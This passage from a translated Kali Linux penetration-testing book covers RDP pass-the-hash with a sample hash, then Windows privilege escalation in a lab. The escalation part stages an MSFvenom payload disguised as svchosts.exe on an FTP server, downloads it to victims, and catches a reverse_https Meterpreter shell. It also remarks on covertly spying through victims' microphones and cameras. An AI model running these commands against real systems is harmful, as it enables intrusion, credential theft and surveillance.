FreeRDP - A Free Remote Desktop Protocol Implementation See www.freerdp.com for more information Usage: xfreerdp [file] [options] [/v:<server>[:port]] Syntax: /flag (enables flag) /option:<value> (specifies option with value) +toggle -toggle (enables or disables toggle, where '/' is a synonym of '+') /a:<addin>[,<options>] Addin /action-script:<file-name> Action script /admin Admin (or console) session +aero Enable desktop composition (default:off) /app:<path> or ||<alias> Remote application program /app-cmd:<parameters> Remote application command-line parameters /app-file:<file-name> File to open with remote application /app-guid:<app-guid> Remote application GUID /app-icon:<icon-path> Remote application icon for user interface /app-name:<app-name> Remote application name for user interface /assistance:<password> Remote assistance password +async-channels Asynchronous channels (experimental) (default:off) +async-input Asynchronous input (default:off) +async-transport Asynchronous transport (experimental) (default:off) +async-update Asynchronous update (default:off) /audio-mode:<mode> Audio output mode +auth-only Authenticate only (default:off) -authentication Authentication (expermiental) (default:on) +auto-reconnect Automatic reconnection (default:off) /auto-reconnect-max-retries:... Automatic reconnection maximum retries, 0 for unlimited [0,1000] -bitmap-cache Enable bitmap cache (default:on) /bpp:<depth> Session bpp (color depth) /buildconfig Print the build configuration /cert-ignore Ignore certificate /cert-name:<name> Certificate name /cert-tofu Automatically accept certificate on first connect /client-hostname:<name> Client Hostname to send to server -clipboard Redirect clipboard (default:on) /codec-cache:rfx|nsc|jpeg Bitmap codec cache -compression Enable compression (default:on) /compression-level:<level> Compression level (0,1,2) +credentials-delegation Disable credentials delegation (default:off) /d:<domain> Domain -decorations Window decorations (default:on) /disp Display control /drive:<name>,<path> Redirect directory <path> as named share <name> +drives Redirect all mount points as shares (default:off) /dvc:<channel>[,<options>] Dynamic virtual channel /dynamic-resolution Send resolution updates when the window is resized /echo Echo channel -encryption Encryption (experimental) (default:on) /encryption-methods:... RDP standard security encryption methods /f Fullscreen mode (<Ctrl>+<Alt>+<Enter> toggles fullscreen) -fast-path Enable fast-path input/output (default:on) +fipsmode Enable FIPS mode (default:off) +fonts Enable smooth fonts (ClearType) (default:off) /frame-ack:<number> Number of frame acknowledgement /from-stdin[:force] Read credentials from stdin. With <force> the prompt is done before connection, otherwise on server request. /g:<gateway>[:<port>] Gateway Hostname /gateway-usage-method:direct|detect Gateway usage method /gd:<domain> Gateway domain /gdi:sw|hw GDI rendering /geometry Geometry tracking channel +gestures Consume multitouch input locally (default:off) /gfx[:RFX|AVC420|AVC444] RDP8 graphics pipeline (experimental) /gfx-h264[:AVC420|AVC444] RDP8.1 graphics pipeline using H264 codec +gfx-progressive RDP8 graphics pipeline using progressive codec (default:off) +gfx-small-cache RDP8 graphics pipeline using small cache mode (default:off) +gfx-thin-client RDP8 graphics pipeline using thin client mode (default:off) +glyph-cache Glyph cache (experimental) (default:off) /gp:<password> Gateway password -grab-keyboard Grab keyboard (default:on) /gt:rpc|http|auto Gateway transport type /gu:... Gateway username /gat:<access token> Gateway Access Token /h:<height> Height +heartbeat Support heartbeat PDUs (default:off) /help Print help +home-drive Redirect user home as share (default:off) /ipv6 Prefer IPv6 AAA record over IPv4 A record /jpeg Enable JPEG codec /jpeg-quality:<percentage> JPEG quality /kbd:0x<id> or <name> Keyboard layout /kbd-fn-key:<value> Function key value /kbd-list List keyboard layouts /kbd-subtype:<id> Keyboard subtype /kbd-type:<id> Keyboard type /load-balance-info:<info-string> Load balance info /log-filters:... Set logger filters, see wLog(7) for details /log-level:... Set the default log level, see wLog(7) for details /max-fast-path-size:<size> Specify maximum fast-path update size /max-loop-time:<time> Specify maximum time in milliseconds spend treating packets +menu-anims Enable menu animations (default:off) /microphone[:...] Audio input (microphone) /monitor-list List detected monitors /monitors:<id>[,<id>[,...]] Select monitors to use -mouse-motion Send mouse motion (default:on) /multimedia[:...] Redirect multimedia (video) /multimon[:force] Use multiple monitors +multitouch Redirect multitouch input (default:off) +multitransport Support multitransport protocol (default:off) -nego Enable protocol security negotiation (default:on) /network:... Network connection type /nsc Enable NSCodec -offscreen-cache Enable offscreen bitmap cache (default:on) /orientation:0|90|180|270 Orientation of display in degrees /p:<password> Password /parallel[:<name>[,<path>]] Redirect parallel device /parent-window:<window-id> Parent window id +password-is-pin Use smart card authentication with password as smart card PIN (default:off) /pcb:<blob> Preconnection Blob /pcid:<id> Preconnection Id /pheight:<height> Physical height of display (in millimeters) /play-rfx:<pcap-file> Replay rfx pcap file /port:<number> Server port +print-reconnect-cookie Print base64 reconnect cookie after connecting (default:off) /printer[:<name>[,<driver>]] Redirect printer device /proxy:[<proto>://]<host>:<port> Proxy (see also environment variable below) /pth:<password-hash> Pass the hash (restricted admin mode) /pwidth:<width> Physical width of display (in millimeters) /reconnect-cookie:<base64-cookie> Pass base64 reconnect cookie to the connection /restricted-admin Restricted admin mode /rfx RemoteFX /rfx-mode:image|video RemoteFX mode /scale:100|140|180 Scaling factor of the display /scale-desktop:<percentage> Scaling factor for desktop applications (value between 100 and 500) /scale-device:100|140|180 Scaling factor for app store applications /sec:rdp|tls|nla|ext Force specific protocol security +sec-ext NLA extended protocol security (default:off) -sec-nla NLA protocol security (default:on) -sec-rdp RDP protocol security (default:on) -sec-tls TLS protocol security (default:on) /serial[:...] Redirect serial device /shell:<shell> Alternate shell /shell-dir:<dir> Shell working directory /size:... Screen size /smart-sizing[:<width>x<height>] Scale remote desktop to window size /smartcard[:<name>[,<path>]] Redirect smartcard device /sound[:...] Audio output (sound) /span Span screen over multiple monitors /spn-class:<service-class> SPN authentication service class /ssh-agent SSH Agent forwarding channel /t:<title> Window title -themes Enable themes (default:on) /tls-ciphers:netmon|ma|ciphers Allowed TLS ciphers -toggle-fullscreen Alt+Ctrl+Enter toggles fullscreen (default:on) /u:... Username +unmap-buttons Let server see real physical pointer button (default:off) /usb:... Redirect USB device /v:<server>[:port] Server hostname /vc:<channel>[,<options>] Static virtual channel /version Print version /video Video optimized remoting channel /vmconnect[:<vmid>] Hyper-V console (use port 2179, disable negotiation) /w:<width> Width -wallpaper Enable wallpaper (default:on) +window-drag Enable full window drag (default:off) /wm-class:<class-name> Set the WM_CLASS hint for the window instance /workarea Use available work area Examples: xfreerdp connection.rdp /p:Pwd123! /f xfreerdp /u:CONTOSO\JohnDoe /p:Pwd123! /v:rdp.contoso.com xfreerdp /u:JohnDoe /p:Pwd123! /w:1366 /h:768 /v:192.168.1.100:4489 xfreerdp /u:JohnDoe /p:Pwd123! /vmconnect:C824F53E-95D2-46C6-9A18-23A5BB403532 /v:192.168.1.100 Clipboard Redirection: +clipboard Drive Redirection: /drive:home,/home/user Smartcard Redirection: /smartcard:<device> Serial Port Redirection: /serial:<name>,<device>,[SerCx2|SerCx|Serial],[permissive] Serial Port Redirection: /serial:COM1,/dev/ttyS0 Parallel Port Redirection: /parallel:<name>,<device> Printer Redirection: /printer:<device>,<driver> Audio Output Redirection: /sound:sys:oss,dev:1,format:1 Audio Output Redirection: /sound:sys:alsa Audio Input Redirection: /microphone:sys:oss,dev:1,format:1 Audio Input Redirection: /microphone:sys:alsa Multimedia Redirection: /multimedia:sys:oss,dev:/dev/dsp1,decoder:ffmpeg Multimedia Redirection: /multimedia:sys:alsa USB Device Redirection: /usb:id,dev:054c:0268 For Gateways, the https_proxy environment variable is respected: export https_proxy=http://proxy.contoso.com:3128/ xfreerdp /g:rdp.contoso.com ... More documentation is coming, in the meantime consult source files  
```

正如我们所看到的，此应用程序具有比 Rdesktop 更多的支持功能，并且对于正常访问 Windows 机器来说也是一个很棒的应用程序。可以通过调用文件来构建配置文件，并且可以启动复杂的设置。这些功能中的许多功能超出了本书的范围。让我们看看最有用的标志，`/pth:<password-hash>`。此标志将传递哈希而不是明文密码并登录系统。以下是我用于访问系统的字符串：

```
xfreerdp -v:172.16.42.5 /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:23900518f88d6ec5ae40e134fdbb1959 /d:LAB1 
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/45c87fe2-b0c4-455f-aa12-b6995cee5d2e.png)

如果我们知道密码，我们可以使用以下标志访问系统：

```
xfreerdp -v:172.16.42.5 /u:Administrator /p: 442Night! /d:LAB1  
```

等等，还有更多！

不仅可以使用此应用程序访问远程桌面，而且通过使用 RDP 进入系统并设置远程协助，您可以使用`/assistance:<password>`标志再次使用此应用程序登录，现在您可以观看已登录用户的桌面。只需小心您的鼠标，否则用户会知道您在那里。

通过使用音频和多媒体标志，攻击者可以在远程系统上打开麦克风和摄像头，并对毫无戒心的用户进行*窥探*。当您可以远程访问笔记本电脑时，谁还需要花哨的间谍技术？笔记本电脑现在是窃听器。（人们想知道为什么我在摄像头上贴了创可贴）。

# 摘要

在本章中，您已经学会了如何使用已知漏洞访问系统以及如何使用窃取的凭据在机器之间移动。您已经了解了来自 NSA 的泄露漏洞以及它们的使用方式，以及一些这些漏洞如今在互联网上造成的混乱。

在下一章中，您将学习如何将您的权限从普通用户帐户提升到 SYSTEM 级别访问权限，当您只有普通用户权限时。

# 进一步阅读

永恒之蓝：

+   [`cvedetails.com/cve/CVE-2017-0143/`](https://cvedetails.com/cve/CVE-2017-0143/)

+   [`cvedetails.com/cve/CVE-2017-0144/`](https://cvedetails.com/cve/CVE-2017-0144/)

+   [`cvedetails.com/cve/CVE-2017-0145/`](https://cvedetails.com/cve/CVE-2017-0145/)

+   [`cvedetails.com/cve/CVE-2017-0146/`](https://cvedetails.com/cve/CVE-2017-0146/)

+   [`cvedetails.com/cve/CVE-2017-0147/`](https://cvedetails.com/cve/CVE-2017-0147/)

+   [`cvedetails.com/cve/CVE-2017-0148/`](https://cvedetails.com/cve/CVE-2017-0148/)

+   [`technet.microsoft.com/en-us/library/security/MS17-010`](https://technet.microsoft.com/en-us/library/security/MS17-010)

+   [`zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html`](https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html)

+   [`github.com/countercept/doublepulsar-detection-script`](https://github.com/countercept/doublepulsar-detection-script)

+   [`technet.microsoft.com/en-us/library/security/ms17-010.aspx`](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)

+   [`github.com/worawit/MS17-010`](https://github.com/worawit/MS17-010)

+   [`hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf`](https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf)

+   [`blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/`](https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/)

+   [`github.com/worawit/MS17-010`](https://github.com/worawit/MS17-010)


# 第八章：Windows 权限提升和保持访问

在本章中，您将学习一旦利用了系统，如何将您的权限提升到系统级别访问。您还将学习即使攻击失败时如何从系统中获取信息。没有完全的失败；即使事情出错时，总是有东西可以学习。您将学习如何向您的攻击添加持久性，以保持对受害者机器的未来访问。

在本章中，您将学习以下主题：

+   Windows 权限提升

+   MS16-032 次要登录句柄权限提升

+   Windows 提升服务权限本地权限提升

+   保持访问

# 技术要求

在本章中，您将需要一个目标 Windows 机器和一个正在运行的 Kali 实例。

# Windows 权限提升

特权提升是获得比所使用的帐户被赋予的更高级别访问权限。在黑客术语中，这被称为**rooting the box**。这来自 UNIX/Linux 世界，其中 root 是管理员帐户。有了这个访问级别，你就拥有了这个系统。在 Windows 系统中，管理员帐户具有管理员级别的访问权限，并且可以对系统进行几乎任何操作。但是，在 Windows 中，还有更高级别的访问权限，称为系统。有了这个帐户，您可以完全控制系统的所有级别。这就是我们想要的访问级别。

获得用户帐户的访问权限比攻击中获得域管理员帐户要容易得多。用户帐户比管理员帐户更多，因此仅仅通过数量来捕获其中一个（有线或无线）更容易。用户帐户通常被锁定，因此您无法获得对机器系统级别的任何真正访问权限。在这里，我们将绕过这一点。一旦获得对机器的实际访问权限，提升您的权限就很容易，我们将看到。

在本章中，我们有一个由防火墙保护的网络，其中有两台服务器和两台工作站。网络还有一个无线接入点。作为攻击者，我们通过无线设备侵入了网络，并使用 SMB 中毒攻击从网络中获取了用户帐户哈希。使用这些窃取的凭据，我们将访问网络上的工作站，并逐步提升网络阶梯，以获得对域控制器的访问权限。

# 提升您的权限

我们使用 Responder 工具运行了 SMB 中毒攻击，并捕获了两个帐户。一个是用户帐户`fflintstone`，我们很幸运地还捕获了`Administrator`帐户的一个 NTLMv2 哈希。正如我们在下面的屏幕截图中所看到的，通过运行攻击以将 HTTP-NTLM 支持降级为基本支持，我们捕获了`fflintstone`的明文密码，因此我们有一个加密密码可供使用。NTLMv2 哈希与 V1 哈希不同，V2 哈希使用服务器到客户端通信中给出的挑战和响应进行加盐。因此，我们不能仅仅使用哈希来代替实际密码进行登录，但如果只捕获到哈希，我们可以使用密码破解工具（如 John、Hashcat 或 Hydra）轻松破解这个哈希并获得实际密码。由于我们很幸运地获得了明文密码，我们将使用这个密码。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/65f8d640-7129-4eed-995a-ea88f1ec3db6.png)

一旦我们获得了受害者的机器访问权限，我们将需要一个有效负载来连接到攻击机器。因此，让我们使用 MSFvenom 工具构建一个快速有效负载，以上传到我们的受害者。

# MSFvenom

MSFvenom 是一个利用打包工具，配备了 Metasploit 框架。MSFvenom 能够构建从简单利用到包含代码以混淆用于绕过反病毒服务的利用的复杂利用。在这里，我们将构建一个简单的利用来运行。通常，我会首先构建和运行简单的利用，如果反病毒出现问题，我会尝试构建一个绕过反病毒的利用。

MSFvenom 是一个非常强大的工具，我们可以从以下`help`文件中看到：

```
    MsfVenom - a Metasploit standalone payload generator.
    Also a replacement for msfpayload and msfencode.
    Usage: /usr/bin/msfvenom [options] <var=val>
    Options:
    -p, --payload  <payload> Payload to use. Specify a '-' or stdin to use custom payloads
    --payload-options   List the payload's standard options
    -l, --list   [type]  List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled  <length>  Prepend a nopsled of [length] size on to the payload
    -f, --format  <format>  Output format (use --help-formats for a list)
    --help-formats    List available formats
    -e, --encoder  <encoder> The encoder to use
    -a, --arch   <arch>  The architecture to use
    --platform  <platform> The platform of the payload
    --help-platforms    List available platforms
    -s, --space   <length>  The maximum size of the resulting payload
    --encoder-space <length>  The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars  <list>  The list of characters to avoid example: '\x00\xff'
    -i, --iterations <count>  The number of times to encode the payload
    -c, --add-code  <path>  Specify an additional win32 shellcode file to include
    -x, --template  <path>  Specify a custom executable file to use as a template
    -k, --keep      Preserve the template behavior and inject the payload as a new thread
    -o, --out   <path>  Save the payload
    -v, --var-name  <name>  Specify a custom variable name to use for certain output formats
    --smallest     Generate the smallest possible payload
    -h, --help      Show this message

```

通过运行`msfvenom --help-formats`命令，我们可以得到有效负载可以编译为的格式列表。

可执行格式如下：

`asp`，`aspx`，`aspx-exe`，`axis2`，`dll`，`elf`，`elf-so`，`exe`，`exe-only`，`exe-service`，`exe-small`，`hta-psh`，`jar`，`jsp`，`loop-vbs`，`macho`，`msi`，`msi-nouac`，`osx-app`，`psh`，`psh-cmd`，`psh-net`，`psh-reflection`，`vba`，`vba-exe`，`vba-psh`，`vbs`和`war`。

转换格式如下：

`bash`，`c`，`csharp`，`dw`，`dword`，`hex`，`java`，`js_be`，`js_le`，`num`，`perl`，`pl`，`powershell`，`ps1`，`py`，`python`，`raw`，`rb`，`ruby`，`sh`，`vbapplication`和`vbscript`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/5c558df9-d1e2-4a6c-b06c-6a9cb55f85d1.png)

现在我们有了我们的有效负载，我们需要将其上传，以便我们可以从受害者的机器上下载它。所有 Windows 系统都配备了内置的 FTP 客户端，可以通过命令行界面或使用 PowerShell 来运行。PowerShell 脚本也可以用于使用 FTP 或 HTTP 服务获取文件。就我个人而言，我喜欢简单的 FTP 客户端。Metasploit 专门为此目的内置了 FTP 服务器。要从 MSFconsole 启动此服务，请从命令行运行以下命令：

+   `msfdb start`：这将启动 Metasploit 数据库

+   `mfsconsole`：这将启动控制台

+   `workspace <NameOfWorkspace>`：这将使您进入现有的工作区

+   `use auxiliary/server/ftp`：这将使您进入 FTP 服务器配置

通过运行`show options`命令，我们可以看到服务的选项如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/67a9cd4a-b831-4365-b2be-edac425e7417.png)

我们看到`FTPROOT`选项设置为`/tmp/ftproot`目录。对于一次性使用，您需要运行`mkdir /tmp/ftproot`命令，这将设置服务的目录并允许您将您的利用程序复制到此目录。这对一次性使用很好，但当系统关闭时，`/tmp`目录会被清空，因此目录和文件会被删除。有时，这是您想要的结果。我喜欢保留我的文件以备后用，因此我通过运行`mkdir /var/ftproot`命令来设置以下目录。此目录将永久保留，任何文件或利用程序在关闭后仍将保留。我们将保留`FTPUSER`和`FTPPASS`字段为空，并使用匿名连接来获取文件，因为我们只会让此服务运行一段时间。如果您需要让服务运行一段时间，或者您在一个敌对网络上，可能明智地设置这两个选项。我们需要设置以下选项。

我们攻击机的地址是`172.16.42.215`，如下所示：

```
set SRVHOST 172.16.42.215
set FTPROOT /var/ftproot
```

我们需要将我们构建的利用程序复制到`ftproot`目录中，如下所示：

```
    cp srvhosts.exe /var/ftproot/srvhosts.exe
```

然后我们需要使用`run`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/0f68015f-ff6a-4632-be02-8872918b47fa.png)

这将启动 FTP 服务。通过运行`jobs`命令，我们可以看到正在运行的服务。

我们现在在 FTP 服务上设置了有效负载的有效登录，所以我们准备好发动攻击。在我们对系统的扫描中，我们看到 RDP 服务在端口`3389`上运行，因此我们将使用**rdesktop**应用程序连接到系统，如下所示：

```
rdesktop 172.16.42.6  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/2fc0e76f-edf0-44a2-9667-81aad699781b.png)

单击“其他用户”按钮以进入默认登录屏幕，并输入捕获的域凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/91808fb5-d0c1-4299-bd5b-3774c594b331.png)

一旦我们进入，要么打开命令行界面，要么打开 PowerShell 窗口，并按照以下方式下载文件。攻击机器的 IP 地址是`172.16.42.215`：

```
ftp 172.16.42.215 
```

它会要求一个用户名；输入`anonymous`并按下*Enter*键。然后，服务将要求密码。同样，只需按下*Enter*键，留空即可。

这将在这个设置上正常工作。运行`dir`命令，我们可以看到我们的利用程序；我们将通过运行以下命令将其下载到 Windows 的`temp`目录中：

```
GET svchosts.exe C:\Windows\temp\svchosts.exe  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/9c5d97a8-e4e5-4855-abfd-ab5a1b6765ba.png)

MSFconsole 还将报告文件下载如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/74ff9117-3e5d-4517-9c3e-4120af57dff7.png)

在运行利用程序之前，我们需要在攻击机器上设置利用处理程序。我们将为利用程序设置 Metasploit 多/处理程序，以便利用程序连接。处理程序的默认有效载荷是`reverse_tcp`有效载荷，并在端口`4444`上运行。

当我们构建我们的利用程序时，我们设置它使用`reverse_https`来隐藏我们的流量作为 HTTPS 流量，因此我们必须更改默认设置。从 MSFconsole 中运行以下命令：

```
use exploit/multi/handler
set LHOST 172.16.42.215 //(the attacking machine)
set LPORT 443
set PAYLOAD windows/meterpreter/reverse_https (sets the handler payload)
show options //(this will let you check the settings)
run -j //(the -j option will run the handler as a job in the background)  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b70ea545-eef3-4bcd-ab4d-08565de7e39b.png)

运行`jobs`命令，我们可以看到处理程序现在正在运行，还有 FTP 服务也在运行。我们现在可以通过运行以下命令来终止 FTP 服务：

```
jobs -k 1  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a3ca6fec-55c4-49a8-b859-82054e93a8e2.png)

现在我们已经准备好在受害者的机器上运行我们的利用程序。从命令行窗口或 PowerShell 运行以下命令：

```
C:\Windows\temp\svchosts.exe
```

这将启动利用程序并连接到攻击者机器上的处理程序。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/51077842-bbc8-4ae1-805b-8bed4f45a92c.png)

在攻击者的系统中，在 Metasploit 中，我们可以看到利用程序连接到处理程序。然后，通过运行`sessions -l`命令，我们可以看到正在运行的会话。接下来，通过运行`sessions -i 2`命令，我们可以在机器上启动一个 Meterpreter shell。然后，通过运行`sysinfo`命令，我们可以看到我们连接到 BO-SRV2：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/1cd7a229-23ba-4192-b268-11701904142e.png)

从我们会话的信息中，我们可以看到我们以`LAB1\rred`的身份连接。根据早期的足迹，我们知道这是一个没有管理员权限的域用户帐户，因此我们需要提升帐户权限以获取我们的好处。让我们运行`getsystem`命令。该命令使用 15 种内置方法来获取系统管理员权限。

以下截图显示未能获取系统访问权限。哎呀！看一下以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6724cab0-64ac-4855-b1d3-e6b8f5be53e2.png)

我们可以通过运行`getuid`命令来检查此失败，然后它会通过显示我们仍然以`LAB1\rred`的身份连接来做出响应。

在渗透测试中，持久性意味着不仅仅是持续运行利用程序。有时，它涉及使用许多后期利用程序对系统进行攻击，以提升权限。有些利用程序在某些系统上有效，而在其他时候则无效。持久性是关键。在利用这个系统时，作者不得不经历许多`post/windows`和`exploit/windows/local`模块，最终提升了他的用户权限。所示的`post`工具和利用程序在此次攻击中失败了，但在另一个系统上可能会成功。一旦你有了 Meterpreter shell，你会想要退出 shell，但仍然保持连接，方法是输入`background`并按下*Enter*键。

您可以通过运行以下命令找到`post/windows`和`exploit/windows/local`。结果将显示模块的日期。您将要使用比目标系统的年龄更老的模块。在运行 Server 2008 的系统上运行 Windows 2000 的利用程序没有多大用处。该利用程序将已经通过版本更新进行了修补。

+   `search post/windows`：这将找到后期模块

+   `search exploit/windows/local`：这将找到可以在活动会话上运行的利用程序

# MS16-032 次要登录句柄权限提升

接下来，我们将运行 MS16-032 次要登录句柄权限提升模块。模块的信息如下：

```
    msf > info exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    Name: MS16-032 Secondary Logon Handle Privilege Escalation
    Module: exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    Platform: Windows
    Privileged: No
    License: BSD License
    Rank: Normal
    Disclosed: 2016-03-21

    Provided by:
    James Forshaw
    b33f
    khr0x40sh

    Available targets:
    Id Name
    -- ----
    0 Windows x86
    1 Windows x64

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    SESSION     yes  The session to run this module on.

    Payload information:

    Description:
    This module exploits the lack of sanitization of standard handles in 
    Windows' Secondary Logon Service. The vulnerability is known to 
    affect versions of Windows 7-10 and 2k8-2k12 32 and 64 bit. This 
    module will only work against those versions of Windows with 
    Powershell 2.0 or later and systems with two or more CPU cores.

```

有关 MS（MS16-032）的更多信息，请参阅以下参考资料：

+   [`cvedetails.com/cve/CVE-2016-0099/`](https://cvedetails.com/cve/CVE-2016-0099/)

+   [`twitter.com/FuzzySec/status/723254004042612736`](https://twitter.com/FuzzySec/status/723254004042612736)

+   [`googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html`](https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html)

此漏洞的作用是使用任意令牌创建新进程。这会欺骗服务使用特权访问令牌，从而绕过安全限制。

要使用此模块，请运行以下命令：

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/29702ab4-d1de-4508-b362-c000b3730ea8.png)

通过运行`show options`命令，我们可以看到只有必须设置的`SESSION`选项。通过运行`sessions -l`命令，我们看到我们的运行会话是`2`。要设置此选项，请运行以下命令：

```
set SESSION 2  
```

然后运行以触发漏洞。我们看到漏洞失败了。漏洞运行了，但未能完全执行。阅读有关此漏洞的信息，我们发现您必须拥有两个或更多核心才能使此漏洞起作用。从系统足迹收集的其他信息中，我们可以假设这个系统是在单核心上运行的虚拟机。失败仍然可以提供有关目标的更多信息。

# Windows 提升服务权限本地权限提升

我们将运行的下一个模块是 Windows 提升服务权限本地权限提升模块，日期为 2012 年。这是一个本地漏洞，通过运行会话运行。同样，我们将使用会话 2。

要使用此模块，请运行以下命令：

```
use exploit/windows/local/service_permissions  
```

模块的描述如下：

```
    msf > info exploit/windows/local/service_permissions

    Name: Windows Escalate Service Permissions Local Privilege Escalation
    Module: exploit/windows/local/service_permissions
    Platform: Windows
    Privileged: No
    License: Metasploit Framework License (BSD)
    Rank: Great
    Disclosed: 2012-10-15

    Provided by:
    scriptjunkie

    Available targets:
    Id Name
    -- ----
    0 Automatic

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    AGGRESSIVE false   no  Exploit as many services as possible (dangerous)
    SESSION      yes  The session to run this module on.

    Payload information:

    Description:
    This module attempts to exploit existing administrative privileges 
    to obtain a SYSTEM session. If directly creating a service fails, 
    this module will inspect existing services to look for insecure file 
    or configuration permissions that may be hijacked. It will then 
    attempt to restart the replaced service to run the payload. This 
    will result in a new session when this succeeds.

```

正如我们在以下输出中所看到的，漏洞再次运行，但仍然没有成功。这可能是一个失败，但从输出中，我们现在知道没有任何使用弱配置运行的服务。从会话超时，我们现在知道任何尝试使用这种方法欺骗服务的方法都是失败的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e8a1ad96-143f-47fd-88fb-ead2c34c83ea.png)

# Windows 提升 UAC 保护绕过（ScriptHost 漏洞）

此模块尝试绕过 Windows 上的 UAC，使用 VB 脚本语言，通过利用`cscript/wscript.exe`可执行文件：

```
    msf > info exploit/windows/local/bypassuac_vbs 

    Name: Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
    Module: exploit/windows/local/bypassuac_vbs
    Platform: Windows
    Privileged: No
    License: Metasploit Framework License (BSD)
    Rank: Excellent
    Disclosed: 2015-08-22

    Provided by:
    Vozzie
    Ben Campbell <eat_meatballs@hotmail.co.uk>

    Available targets:
    Id Name
    -- ----
    0 Automatic

    Basic options:
    Name  Current Setting Required Description
    ----  --------------- -------- -----------
    SESSION     yes  The session to run this module on.

    Payload information:

    Description:
    This module will bypass Windows UAC by utilizing the missing 
    .manifest on the script host cscript/wscript.exe binaries.

```

运行模块后，我们可以在以下屏幕截图中看到，我们试图妥协的用户帐户需要具有管理员权限。嗯，又是一个失败，但我们再次得知，我们正在使用的帐户在域中没有太多权限。我们确实获得了另一个帐户的凭据；也许该帐户有更多权限：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a7ffeb76-5870-4a27-b3ce-3bdd91567466.png)

通过运行`creds`命令，我们得到了一系列捕获的凭据。请注意，有不可重放的哈希，这些对离线破解并不太有用，但我们确实有另一个帐户（`fflintstone`），它使用明文密码捕获。我们将尝试使用我们之前的漏洞来尝试这个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/0b873077-a577-4a8e-a4ed-250aae94d136.png)

现在，要使其运行，必须更改 multi/handler 的用户帐户，因此我们需要终止会话 2，然后以`fflintstone`的身份 RDP 登录，然后重新运行漏洞以获得该用户的权限。我们需要重新进入 multi/handler 模块。

+   `use exploit/multi/handler`：这会将您带回处理程序

+   `sessions -k 2`：这会终止运行的会话 2

+   `run -j`：这会重新启动 multi/handler 以接受新连接，并将其作为后台作业运行

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e9187b0c-0a39-4744-8bab-76fa71c31647.png)

现在，使用`fflintstone`帐户登录 RDP 会话后，我们将再次从命令行或 PowerShell 运行有效负载。

```
C:\Windows\Temp\svchosts.exe  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/7fdc87d0-45c1-4aa8-b2bf-f44ad013fd0e.png)

在下面的截图中，我们可以看到我们的 Kali 盒子上的处理程序已接受连接，并在会话 3 上设置了一个 Meterpreter 会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/2f0ef787-59ec-40b2-9ed7-1e53f6a8393c.png)

所以，现在让我们回到绕过 UAC 利用程序，并在新会话中运行它。要做到这一点，运行以下命令：

+   `back`：这将退出处理程序而不终止它，或任何会话

+   `use exploit/windows/local/bypassuac_vbs`：这将使您重新进入模块

+   `set session 3`：这将使利用程序使用会话 3

+   `exploit`：这将启动它

在下面的截图中，我们可以看到我们仍然失败了。看来 UAC 设置有更高的安全设置，无法被利用。再次，持久性是关键：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/2d61ef9a-be1c-45ea-a9db-84105696ce8c.png)

看来 BO-SRV2 对我们目前拥有的帐户来说相当安全，所以让我们去攻击另一台机器。我们还没有尝试域控制器，所以让我们继续进行。我们以`LAB1\fflintstone`的身份使用 RDP 登录，并以与我们在 BO-SRV2 上相同的方式将我们的利用程序通过 FTP 传输到域控制器。在下面的截图中，我们切换到`C:\Windows\Temp`目录，然后连接回我们的 Kali 机器并下载利用程序，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/9241aead-3295-4274-a258-a9c23d45c3d2.png)

再次，我们准备运行利用程序并连接回我们的 Kali 盒子。确保您的多/处理程序设置并运行！现在，运行可执行文件。

